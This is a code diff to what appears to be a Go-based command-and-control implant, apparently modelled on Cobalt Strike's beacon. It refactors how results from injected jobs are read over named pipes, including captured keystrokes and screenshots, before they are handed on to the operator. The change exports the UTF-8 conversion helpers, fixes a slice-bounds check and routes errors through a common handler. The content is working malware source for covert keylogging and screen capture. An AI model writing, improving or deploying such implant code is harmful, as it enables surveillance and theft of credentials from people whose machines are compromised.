@@ -277,7 +277,7 @@ func InjectSelf(sh []byte) ([]byte, error) {
 
 }
 
-func convertData2UTF8(buf []byte) ([]byte, error) {
+func ConvertData2UTF8(buf []byte) ([]byte, error) {
 	buff := bytes.NewBuffer(buf)
 	data, err := util.ParseAnArgLittle(buff)
 	if err != nil {
@@ -300,7 +300,7 @@ func convertData2UTF8(buf []byte) ([]byte, error) {
 	return retBuf, nil
 }
 
-func convertWinUser2UTF8(buf []byte) ([]byte, error) {
+func ConvertWinUser2UTF8(buf []byte) ([]byte, error) {
 	buff := bytes.NewBuffer(buf)
 	_, err := util.ParseAnArgLittle(buff)
 	if err != nil {
@@ -377,18 +377,15 @@ func HandlerJob(b []byte) ([]byte, error) {
 	}
 
 	result, err := ReadNamedPipeAll(pipeName)
-
-	if result != "" {
-		if callbackType == CALLBACK_SCREENSHOT {
-			resultBytes, err := convertWinUser2UTF8([]byte(result[4:]))
+	resultBytes := []byte(result)
+	if len(resultBytes) > 0 {
+		if callbackType == CALLBACK_SCREENSHOT && len(resultBytes) > 4 {
+			resultBytes, err = ConvertWinUser2UTF8(resultBytes[4:])
 			if err != nil {
 				ErrorProcess(err)
 			}
-
-			DataProcess(callbackType, resultBytes)
-		} else {
-			DataProcess(callbackType, []byte(result))
 		}
+		DataProcess(callbackType, resultBytes)
 	} else {
 		ErrorProcess(errors.New("result error"))
 	}
@@ -416,26 +413,23 @@ func ReadNamedPipe(pipeName []byte, callbackType int, sleepTime uint16) (string,
 			}
 			break
 		}
-		var send []byte
+		resultBytes := buf[:n]
 		if n > 0 {
-			resultBytes := buf[:n]
 			if callbackType == CALLBACK_KEYSTROKES && len(resultBytes) > 4 {
-				send, err = convertWinUser2UTF8(resultBytes)
+				resultBytes, err = ConvertWinUser2UTF8(resultBytes)
 				if err != nil {
-					fmt.Printf("convertWinUser2UTF8 error: %v\n", err)
+					ErrorProcess(err)
 				}
-				send, err = convertData2UTF8(send)
+				resultBytes, err = ConvertData2UTF8(resultBytes)
 				if err != nil {
-					fmt.Printf("convertData2UTF8 error: %v\n", err)
+					ErrorProcess(err)
 				}
-			} else {
-				send = resultBytes
 			}
 
-			DataProcess(callbackType, send)
+			DataProcess(callbackType, resultBytes)
 			time.Sleep(time.Millisecond * time.Duration(sleepTime))
 		}
-		result += string(send)
+		result += string(resultBytes)
 	}
 	return result, nil
 }
